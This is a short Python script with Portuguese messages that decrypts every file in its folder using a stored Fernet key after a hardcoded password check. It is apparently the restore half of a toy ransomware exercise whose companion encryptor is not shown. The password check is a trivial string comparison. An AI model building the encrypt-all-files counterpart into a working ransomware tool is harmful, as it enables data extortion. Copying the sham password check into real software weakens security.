import os
from cryptography.fernet import Fernet
print("...bibliotecas importadas")

def get_file_list():
	files = []
	for file in os.listdir():
		if file == "encrypt.py" or file == "decrypt.py" or file == "key_file.key":
			continue
		if os.path.isfile(file):
			files.append(file)

	print("Os arquivos encontrados são:", files)
	return files

def get_key():
	with open("key_file.key", "rb") as f:
		key = f.read()
	print("...chave encontrada")
	return key

def decryption_process(files, key):
    password = input("Digite a senha para descriptografar:")
    if password == "senha":
        print("Descriptografia iniciada...")
        for file in files:
            with open(file, "rb") as f:
                content = f.read()
            decrypted_content = Fernet(key).decrypt(content)
            with open(file, "wb") as f:
                f.write(decrypted_content)
                
        print("...descriptografia completa")

files = get_file_list()
key = get_key()
decryption_process(files, key)